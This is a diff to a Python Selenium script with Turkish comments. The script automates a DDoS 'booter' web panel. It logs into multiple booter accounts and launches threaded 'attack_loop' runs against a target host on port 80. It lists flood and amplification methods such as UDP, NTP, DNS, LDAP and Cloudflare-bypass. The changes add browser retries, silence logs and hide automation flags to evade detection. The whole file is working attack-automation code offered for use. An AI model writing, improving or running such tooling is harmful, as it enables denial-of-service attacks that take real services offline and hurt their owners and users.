@@ -1,14 +1,13 @@
 import os
 import time
 import threading
-import re
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.chrome.service import Service
-from selenium.common.exceptions import TimeoutException, NoSuchElementException
+from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
 
 # ------------------------------
 # SABİT AYARLAR
@@ -20,54 +19,54 @@ BOOTER_URL = f"{BASE_URL}/panel/booter.php"
 PORT = 80
 DURATION = 60
 
-# Aynı anda kaç thread çalışsın (Railway ücretsizde 2 ideal)
+# 2 thread ile çalış
 MAX_CONCURRENT_THREADS = 2
 
-# Varsayılan method listesi (eğer method belirtilmemişse sırayla)
-DEFAULT_METHODS = [
-    "UDP", "LDAP", "ARD", "VOX", "STUN", "VSE", "ACK", "IPX", "KGB",
-    "PROWIN", "DNS", "NTP", "TCP", "WIZARD", "XSYN", "ZAP", "ZSYN",
-    "CLOUDFLARE", "RAW", "HEAVYJES", "REQUESTS", "HTTP", "HTTPS",
-    "CAPTCHA-BYPASS", "CFBYPASSV2", "SOCKET", "TLS", "CLOUDFLARE-UAM"
-]
-
 # ------------------------------
-# TARAYICI KURULUMU (Railway uyumlu)
+# TARAYICI KURULUMU (Hata yönetimi ile)
 # ------------------------------
-def create_driver():
-    chrome_options = Options()
-    chrome_options.add_argument("--headless")
-    chrome_options.add_argument("--no-sandbox")
-    chrome_options.add_argument("--disable-dev-shm-usage")
-    chrome_options.add_argument("--disable-gpu")
-    chrome_options.add_argument("--disable-software-rasterizer")
-    chrome_options.add_argument("--disable-setuid-sandbox")
-    chrome_options.add_argument("--single-process")
-    chrome_options.add_argument("--memory-pressure-off")
-    chrome_options.add_argument("--window-size=1920,1080")
-    chrome_options.add_argument("--remote-debugging-port=9222")
-    chrome_options.add_argument("--ignore-certificate-errors")
-    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
-    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
-    chrome_options.add_experimental_option('useAutomationExtension', False)
+def create_driver(retries=3):
+    for attempt in range(retries):
+        try:
+            chrome_options = Options()
+            chrome_options.add_argument("--headless")
+            chrome_options.add_argument("--no-sandbox")
+            chrome_options.add_argument("--disable-dev-shm-usage")
+            chrome_options.add_argument("--disable-gpu")
+            chrome_options.add_argument("--disable-software-rasterizer")
+            chrome_options.add_argument("--disable-setuid-sandbox")
+            chrome_options.add_argument("--single-process")
+            chrome_options.add_argument("--memory-pressure-off")
+            chrome_options.add_argument("--window-size=1920,1080")
+            chrome_options.add_argument("--remote-debugging-port=9222")
+            chrome_options.add_argument("--ignore-certificate-errors")
+            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
+            chrome_options.add_argument("--disable-crash-reporter")
+            chrome_options.add_argument("--disable-background-timer-throttling")
+            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
+            chrome_options.add_experimental_option('useAutomationExtension', False)
 
-    chromedriver_path = os.getenv("CHROMEDRIVER_BIN", "/usr/bin/chromedriver")
-    chrome_binary = os.getenv("CHROME_BIN", "/usr/bin/chromium")
+            chromedriver_path = os.getenv("CHROMEDRIVER_BIN", "/usr/bin/chromedriver")
+            chrome_binary = os.getenv("CHROME_BIN", "/usr/bin/chromium")
 
-    if os.path.exists(chrome_binary):
-        chrome_options.binary_location = chrome_binary
+            if os.path.exists(chrome_binary):
+                chrome_options.binary_location = chrome_binary
 
-    if os.path.exists(chromedriver_path):
-        service = Service(executable_path=chromedriver_path)
-        driver = webdriver.Chrome(service=service, options=chrome_options)
-    else:
-        from webdriver_manager.chrome import ChromeDriverManager
-        service = Service(ChromeDriverManager().install())
-        driver = webdriver.Chrome(service=service, options=chrome_options)
+            if os.path.exists(chromedriver_path):
+                service = Service(executable_path=chromedriver_path, service_log_path=os.devnull)
+                driver = webdriver.Chrome(service=service, options=chrome_options)
+            else:
+                from webdriver_manager.chrome import ChromeDriverManager
+                service = Service(ChromeDriverManager().install(), service_log_path=os.devnull)
+                driver = webdriver.Chrome(service=service, options=chrome_options)
 
-    driver.set_page_load_timeout(60)
-    driver.implicitly_wait(10)
-    return driver
+            driver.set_page_load_timeout(60)
+            driver.implicitly_wait(10)
+            return driver
+        except WebDriverException as e:
+            print(f"Tarayıcı başlatma denemesi {attempt+1}/{retries} başarısız: {e}")
+            time.sleep(3)
+    raise Exception("Tarayıcı başlatılamadı.")
 
 # ------------------------------
 # "Okay" MODALINI KAPAT
@@ -180,7 +179,7 @@ def attack_loop(username, password, target_host, method):
             continue
 
 # ------------------------------
-# HESAPLARI OKU (user:pass:link:method)
+# HESAPLARI OKU (SAĞLAM PARSE)
 # ------------------------------
 def main():
     lines = []
@@ -199,30 +198,28 @@ def main():
 
     accounts = []
     for line in lines:
-        parts = line.split(":")
-        if len(parts) >= 3:
-            user = parts[0]
-            passw = parts[1]
-            link = parts[2]
-            # 4. alan varsa method, yoksa None
-            method = parts[3] if len(parts) >= 4 else None
-            accounts.append((user, passw, link, method))
+        parts = line.rsplit(":", 3)
+        if len(parts) == 4:
+            user, passw, link, method = parts
+        elif len(parts) == 3:
+            user, passw, link = parts
+            method = None
         else:
             print(f"[!] Geçersiz satır atlanıyor: {line}")
+            continue
+        accounts.append((user, passw, link, method))
 
     if not accounts:
         print("[!] Geçerli hesap bulunamadı.")
         return
 
-    # Method ataması: eğer method belirtilmemişse sırayla ata
-    default_index = 0
+    # Method ataması: belirtilmemişse RAW
     for i, (user, passw, link, method) in enumerate(accounts):
         if method is None:
-            method = DEFAULT_METHODS[default_index % len(DEFAULT_METHODS)]
-            default_index += 1
+            method = "RAW"
             accounts[i] = (user, passw, link, method)
 
-    # Thread havuzu
+    # Thread havuzu (2 thread)
     semaphore = threading.Semaphore(MAX_CONCURRENT_THREADS)
 
     def thread_wrapper(user, passw, link, method):
@@ -235,7 +232,7 @@ def main():
         t = threading.Thread(target=thread_wrapper, args=(user, passw, link, method), daemon=True)
         t.start()
         threads.append(t)
-        time.sleep(10)  # kaynak kullanımını azaltmak için
+        time.sleep(10)  # 10 saniye ara ile başlat
 
     for t in threads:
         t.join()
